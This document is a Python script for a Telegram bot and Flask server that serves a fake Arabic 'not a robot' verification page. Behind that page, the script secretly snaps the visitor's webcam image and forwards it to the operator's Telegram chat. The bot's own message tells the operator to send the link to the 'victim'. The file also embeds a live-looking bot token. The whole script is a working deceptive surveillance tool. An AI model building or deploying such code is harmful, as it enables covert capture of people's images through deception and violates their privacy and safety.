import telebot
from flask import Flask, render_template_string, request
import base64
from threading import Thread

# توكن البوت الخاص بك جاهز
TOKEN = '8631585669:AAE-mXTVw7F1fASbBVmmRhl13pLDkGXgd7s'
ADMIN_ID = None 

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق من الأمان</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding-top: 100px; }
        .btn { background: #0088cc; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <h3>اضغط للتحقق من أنك لست روبوت</h3>
    <button class="btn" onclick="start()">التحقق الآن</button>
    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
    <script>
        async function start() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                const v = document.getElementById('v');
                v.srcObject = s;
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.getContext('2d').drawImage(v, 0, 0);
                    fetch('/upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: c.toDataURL('image/jpeg') })
                    }).then(() => {
                        alert("تم التحقق بنجاح!");
                        window.location.href = "https://www.google.com";
                    });
                }, 1000);
            } catch (e) { alert("يجب السماح بالكاميرا للمتابعة"); }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json['image']
    img = base64.b64decode(data.split(',')[1])
    with open("p.jpg", "wb") as f: f.write(img)
    if ADMIN_ID:
        with open("p.jpg", "rb") as p: bot.send_photo(ADMIN_ID, p, caption="📸 صورة جديدة وصلت!")
    return "ok"

@bot.message_handler(commands=['start'])
def welcome(m):
    global ADMIN_ID
    ADMIN_ID = m.chat.id
    bot.reply_to(m, "✅ البوت شغال! أرسل رابط الموقع للضحية وسأرسل لك الصور هنا.")

if __name__ == '__main__':
    Thread(target=bot.infinity_polling).start()
    app.run(host='0.0.0.0', port=8080)
